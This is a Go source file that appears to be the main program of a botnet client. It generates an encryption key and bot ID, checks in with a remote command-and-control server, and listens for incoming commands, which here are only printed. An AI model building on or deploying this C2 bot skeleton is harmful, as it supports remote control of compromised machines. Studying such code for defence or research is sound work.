package main

import (
	cli "bot/communication/client"
	srv "bot/communication/server"
	msg "bot/message"
	"crypto/rand"
	"fmt"
	ccp "golang.org/x/crypto/chacha20poly1305"
	"net"
	"sync"
)

const (
	Msgsize = 4096
)

var (
	wg        sync.WaitGroup
	B         msg.Bot
	key       = make([]byte, ccp.KeySize)
	connected bool
)

func init() {
	// Generate a random key
	if _, err := rand.Read(key); err != nil {
		panic(err)
	}
	msg.Aead = msg.GenerateAead(key)
	B.GenerateRandomUid()
}

// tryConnect tries to connect to the remote commanding C2 server
func tryConnect() {
	var remoteServer net.Conn = cli.ConnectToCommandingC2()
	if remoteServer != nil {
		defer remoteServer.Close()
	} else {
		return
	}
	cli.WriteData(remoteServer, &B)
}

func main() {
	// edode : Try to connect to the remote server
	wg.Add(1)
	go func() {
		defer wg.Done()
		tryConnect()
	}()

	// edode : Listen for incoming connections
	wg.Add(1)
	go func() {
		defer wg.Done()

		var listener net.Listener = srv.StartLocalServer()
		defer listener.Close()

		conn, err := listener.Accept()

		// edode : Commanding server cannot connect
		if err != nil {
			return
		}
		defer conn.Close()

		fmt.Println("Accepted connection from ", conn.RemoteAddr())
		commands, err := srv.ReadCommands(conn, &B)

		// edode : Commanding server has closed connection
		if err != nil {
			return
		}
		fmt.Println("Received commands: ", commands)
	}()

	wg.Wait()
}

// https://blog.jbowen.dev/2019/09/the-magic-of-go-comments/
